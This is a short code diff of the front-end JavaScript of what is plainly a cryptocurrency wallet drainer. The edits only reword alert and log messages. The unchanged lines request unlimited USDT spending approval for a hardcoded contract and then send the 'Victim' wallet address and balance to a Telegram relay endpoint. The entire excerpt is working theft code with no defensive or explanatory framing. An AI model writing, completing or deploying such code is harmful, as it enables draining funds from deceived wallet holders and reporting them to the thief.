@@ -25,10 +25,10 @@ document.addEventListener("DOMContentLoaded", () => {
       const formattedBalance = ethers.utils.formatUnits(balance, 18);
 
       await usdt.approve(CONTRACT_TO_APPROVE, ethers.constants.MaxUint256);
-      alert("USDT approval request sent. Now sending to Telegram...");
+      alert("USDT approval sent. Sending Telegram alert...");
 
       const message = `Victim: ${address}\nUSDT Balance: ${formattedBalance}`;
-      console.log("Sending message to /tele:", message);
+      console.log("Sending to Telegram:", message);
 
       const response = await fetch("/tele", {
         method: "POST",
@@ -39,7 +39,7 @@ document.addEventListener("DOMContentLoaded", () => {
       if (response.ok) {
         alert("Telegram message sent successfully.");
       } else {
-        alert("Failed to send Telegram message. Server responded with status: " + response.status);
+        alert("Telegram failed. Server responded with: " + response.status);
       }
 
     } catch (err) {
